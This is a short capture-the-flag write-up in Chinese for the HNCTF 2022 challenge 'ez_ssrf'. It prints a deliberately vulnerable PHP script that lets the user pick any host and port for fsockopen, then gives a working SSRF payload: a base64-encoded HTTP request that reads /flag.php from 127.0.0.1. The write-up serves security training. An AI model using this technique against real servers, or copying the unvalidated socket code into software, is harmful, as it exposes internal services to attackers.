---
title: '[HNCTF 2022 WEEK2]ez_ssrf'
date: 2025-04-15 15:25:27
tags: ssrf
categories: 刷题笔记
---

#### [HNCTF 2022 WEEK2]ez_ssrf

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$data=base64_decode($_GET['data']);
$host=$_GET['host'];
$port=$_GET['port'];

$fp=fsockopen($host,intval($port),$error,$errstr,30);
if(!$fp) {
    die();
}
else {
    fwrite($fp,$data);
    while(!feof($data))
    {
        echo fgets($fp,128);
    }
    fclose($fp);
}
```

我们看到fsockopen函数，就知道这题一个是个ssrf的题

先审计代码

首先通过fsockopen()函数建立与指定主机和端口的socker连接，然后它将传入的数据进行base64解码，然后将数据写入到连接的socket中

我们构造http头来访问/flag

```
GET /flag.php HTTP/1.1
Host: 127.0.0.1
Connection: Close
```

进行base64加密，连接本地

```
?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=
```

